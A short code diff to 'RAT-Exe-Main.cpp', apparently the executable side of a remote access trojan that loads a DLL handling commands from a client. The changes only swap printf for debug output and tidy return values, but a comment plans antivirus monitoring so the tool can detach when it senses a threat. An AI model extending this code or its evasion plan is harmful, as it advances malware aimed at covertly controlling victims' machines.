@@ -5,7 +5,7 @@
 #include "RAT-Exe-Main.h"
 
 
-int main()
+INT main()
 {
     OutputDebugStringA("RAT-Exe-Main::main - Initializing program...\n");
 
@@ -46,20 +46,21 @@ int main()
 
         if (!returnValue)
         {
-            printf("Call to DLL main failed \n");
+            OutputDebugStringA("RAT-Exe-Main.cpp::main - Call to DLL main failed \n");
+            return FAILURE;
         }
         else
         {
-            printf("Call to DLL main was successful \n");
+            OutputDebugStringA("RAT-Exe-Main.cpp::main - Call to DLL main was successful! \n");
             FreeLibrary(hGetProcIDLL);
-            return true;
+            return SUCCESS;
         }
     }
 
     // While our DLL handles commands from client continue to survey the system, calling DLL_PROCESS_DETACH once we suspect a threat
     // TODO: Implement further antivirus monitoring 
 
-    return true;
+    return SUCCESS;
 }
 
 
